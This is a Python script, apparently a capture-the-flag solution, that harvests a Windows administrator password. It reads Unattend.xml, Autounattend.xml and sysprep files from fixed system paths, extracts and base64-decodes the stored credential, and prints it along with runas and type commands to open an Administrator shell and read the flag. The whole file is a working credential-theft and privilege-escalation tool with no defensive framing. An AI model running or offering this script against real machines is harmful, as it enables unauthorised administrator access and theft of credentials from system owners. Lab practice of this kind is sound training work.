#!/usr/bin/env python3
import os
import re
import base64
import subprocess

FILES = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Autounattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\System32\Sysprep\Unattend.xml",
    r"C:\Windows\System32\Sysprep\sysprep.inf",
    r"C:\sysprep.inf",
    r"C:\autounattend.xml",
    r"C:\Unattend.xml",
]

def decode_password(value):
    value = value.strip()

    try:
        decoded = base64.b64decode(value)

        for encoding in ("utf-16-le", "utf-8", "latin-1"):
            try:
                text = decoded.decode(encoding).replace("\x00", "")
                if text:
                    return text
            except Exception:
                pass
    except Exception:
        pass

    return value

def extract_password(content):
    patterns = [
        r"<AdministratorPassword>.*?<Value>(.*?)</Value>.*?</AdministratorPassword>",
        r"<Password>.*?<Value>(.*?)</Value>.*?</Password>",
        r"AdminPassword\s*=\s*(.*)",
    ]

    for pattern in patterns:
        match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
        if match:
            return decode_password(match.group(1))

    return None

def main():
    found_password = None

    for path in FILES:
        if os.path.exists(path):
            print(f"[+] Found file: {path}")

            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()

                password = extract_password(content)

                if password:
                    found_password = password
                    print(f"[+] Administrator password: {password}")
                    break

            except Exception as e:
                print(f"[-] Could not read {path}: {e}")

    if not found_password:
        print("[-] No password found.")
        return

    print("\n[+] Use this command to open an Administrator session:")
    print(f'runas /user:Administrator "cmd.exe"')
    print("\nWhen asked for the password, enter:")
    print(found_password)

    print("\n[+] Then retrieve the flag with:")
    print(r'type C:\Users\Administrator\Desktop\flag.txt')

if __name__ == "__main__":
    main()
